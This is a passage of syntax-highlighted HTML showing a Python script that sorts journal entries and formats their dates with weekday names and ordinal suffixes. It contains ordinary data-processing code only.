style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryUuid&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryIndex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;datetime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryDateTime&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryIndex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;tags&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryTags&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; len&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryLocation&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryIndex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryLocation&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; len&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryWeather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryIndex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryWeather&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryIndex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;text&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalData &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; dict&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sorted&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;items&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()))&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;for&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalEntries &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;items&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;():&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; dict&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sorted&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalEntries&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;items&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()))&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;for&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalEntries &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;items&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;():&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tjournalDateTime &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; datetime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strptime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%Y-%m-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;%d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tjournalDayNumber &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDateTime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strftime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;%-d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tjournalDaySuffix &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;th&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalDayNumber &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;==&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; or&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalDayNumber &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;==&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;21&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; or&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalDayNumber &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;==&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;31&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;):&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tjournalDaySuffix &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;st&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\telif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalDayNumber &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;==&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; or&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalDayNumber &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;==&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;22&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;):&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tjournalDaySuffix &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;nd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\telif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalDayNumber &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;==&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; or&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalDayNumber &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;==&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;23&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;):&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tjournalDaySuffix &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;rd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tjournalDayName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDateTime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strftime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tjournalHumanDate &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDateTime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strftime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%B&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDayNumber &lt;/span&gt;&lt;span 